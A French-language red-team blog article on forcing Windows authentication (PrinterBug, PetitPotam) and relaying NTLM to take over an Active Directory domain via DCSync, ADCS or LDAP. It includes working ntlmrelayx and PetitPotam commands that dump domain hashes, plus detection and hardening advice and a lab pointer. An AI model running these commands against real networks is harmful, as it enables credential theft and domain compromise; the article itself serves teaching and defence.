---
title: "Coercition et relais NTLM : forcer une authentification pour prendre le domaine"
date: 2026-06-10
side: "red"
tags: ["active-directory", "ntlm-relay", "coercion", "printerbug", "petitpotam"]
summary: "La coercition force une machine à s'authentifier vers vous. Ce n'est pas une fin mais un déclencheur : selon qu'on capture ou qu'on relaie l'authentification, plusieurs chemins mènent au contrôleur de domaine."
draft: false
---

La coercition est une primitive, pas une fin en soi. Elle consiste à forcer une machine distante à s'authentifier vers une machine que l'on controle. Ce qui rend la technique puissante, c'est ce qu'on fait ensuite de cette authentification forcée : la capturer pour rejouer un ticket Kerberos, ou la relayer en NTLM vers une autre cible. Cet article complète la section unconstrained de l'article sur la délégation, où la coercition servait justement de déclencheur.

## Forcer l'authentification

Le cas historique est le PrinterBug, découvert par Lee Christensen en 2018. Le service Print Spooler, activé par défaut meme sur les versions récentes de Windows, expose deux fonctions RPC qui permettent de forcer une machine à s'authentifier vers n'importe quelle autre. N'importe quel utilisateur du domaine peut le déclencher, la connexion de retour transporte une authentification, et Microsoft a choisi de ne pas corriger le comportement, jugé conforme à la conception.

Le PrinterBug n'est qu'un vecteur parmi d'autres. PetitPotam exploite MS-EFSR, d'autres abusent de MS-DFSNM ou MS-FSRVP. L'outil Coercer les teste et les déclenche tous, ce qui en fait le couteau suisse de la coercition. PrinterBug et PetitPotam restent les deux entrées les plus courantes.

## Capturer ou relayer, le point clé

Une fois l'authentification forcée, deux usages s'ouvrent, et ils n'ont pas les memes prérequis.

La capture vise Kerberos. Si la machine d'écoute est configurée en délégation non contrainte, le TGT de la machine forcée est mis en cache dans sa mémoire, et on le rejoue ensuite. C'est le chemin détaillé dans l'article sur la délégation.

Le relais vise NTLM. On ne garde pas l'authentification, on la transfère immédiatement vers une autre cible qui la croira légitime. La contrainte ici est la signature. Une authentification NTLM arrivant par SMB est bridée par le SMB signing et le contrôle d'intégrité, ce qui limite les cibles de relais. Une coercition passant par WebDAV, donc en HTTP, contourne cette limite et élargit les possibilités, notamment vers LDAP.

## Les chemins de relais

| Relais vers | Prérequis | Résultat |
| --- | --- | --- |
| DCSync | SMB signing désactivé sur les DC | Dump des hashs du domaine |
| Délégation non contrainte | Serveur UD accessible, capture du TGT | Rejeu du ticket d'un compte privilégié |
| AD Certificate Services | Enrolment web ADCS accessible | Certificat du DC, puis authentification en son nom |
| LDAP (RBCD / Shadow Creds) | Relais HTTP ou contournement du signing | Délégation ou clé d'authentification ajoutée |

## Exemple : relais vers DCSync

Le scénario le plus parlant force un contrôleur de domaine à s'authentifier vers la machine d'attaque, puis relaie cette authentification vers un second DC pour y exécuter un DCSync. Le SMB signing doit etre désactivé sur les DC.

```bash
# Terminal 1 : ntlmrelayx en écoute, cible le second DC
impacket-ntlmrelayx -t dcsync://<IP_DC2> -smb2support

# Terminal 2 : déclencher la coercition vers notre machine
python3 PetitPotam.py -u <user> -p <pass> -d <domain> <IP_ATTAQUANT> <IP_DC1>
```

L'authentification de DC1 est relayée vers DC2, qui la traite comme légitime, et le DCSync s'exécute automatiquement. Les hashs du domaine tombent dans le terminal de ntlmrelayx. Une erreur RPC dans la sortie de l'outil de coercition est normale, l'attaque a malgré tout abouti.

## Relais vers ADCS

Variante très répandue, le relais vers les services de certificats. On relaie l'authentification du compte machine du DC vers l'interface web d'enrolment ADCS pour obtenir un certificat au nom du DC, puis on s'authentifie via PKINIT pour récupérer un TGT, et de là le domaine. C'est l'attaque connue sous le nom d'ESC8, qui sera détaillée dans l'article consacré à AD CS.

## Côté défense

La détection est délicate parce que l'attaque ne génère pas l'événement 4662 d'un DCSync classique. Le signal exploitable est ailleurs : un événement 4624 pour le compte machine d'un contrôleur de domaine, mais avec une IP source qui n'est pas la sienne, celle de la machine d'attaque. La bonne pratique est donc de corréler les authentifications des serveurs critiques à leurs adresses IP statiques connues, et de traiter toute connexion depuis une IP inattendue comme suspecte.

En prévention, on désactive le Print Spooler sur tout serveur qui n'imprime pas, contrôleurs de domaine en tete, ou à défaut on bloque les connexions RPC distantes via la clé RegisterSpoolerRemoteRpcEndPoint. On active le SMB signing et la protection EPA sur LDAPS pour neutraliser le relais, et on bloque le trafic sortant en 139 et 445 depuis les serveurs critiques, en gardant ces ports ouverts entre contrôleurs pour la réplication. Une solution de filtrage RPC tierce complète la défense en profondeur.

## Pour s'entrainer

La machine Pirate de Hack The Box enchaine exactement cette logique : une coercition PetitPotam ou PrinterBug force une machine à s'authentifier, l'authentification est relayée vers le LDAP du contrôleur de domaine, et la session ainsi obtenue sert à poser une Shadow Credential. Un excellent terrain pour pratiquer le passage de la primitive de coercition à la compromission effective.